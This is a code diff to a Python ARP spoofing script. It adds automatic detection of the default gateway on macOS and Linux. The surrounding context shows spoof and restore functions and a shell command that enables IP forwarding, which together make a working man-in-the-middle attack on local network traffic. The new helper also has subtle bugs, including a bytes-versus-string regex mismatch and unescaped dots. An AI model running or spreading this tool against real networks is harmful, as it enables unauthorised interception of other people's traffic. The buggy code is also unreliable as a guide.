@@ -4,6 +4,8 @@ import scapy.all as scapy
 import time
 import sys
 import subprocess
+import platform
+import re
 
 def get_mac(ip):
     # use scapy.ls(scapy.ARP()) to see the fields, example: print(arp_request.summary()) -> ARP who has Net('192.168.0.0/24') says 192.168.0.50
@@ -14,6 +16,20 @@ def get_mac(ip):
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
     return answered_list[0][1].hwsrc
+
+def get_default_gateway():
+    if platform.system() == "Darwin":
+        route_default_result = subprocess.check_output(["route", "get", "default"])
+        gateway = re.search(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", route_default_result).group(0)
+
+    elif platform.system() == "Linux":
+        route_default_result = re.findall(r"([\w.][\w.]*'?\w?)", subprocess.check_output(["ip", "route"]))
+        gateway = route_default_result[2]
+
+    if route_default_result:
+        return(gateway)
+    else:
+        print("(x) Could not default gateway.")
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
@@ -28,7 +44,7 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 target_ip = ""
-gateway_ip = "" 
+gateway_ip = get_default_gateway() 
 
 try:
     subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
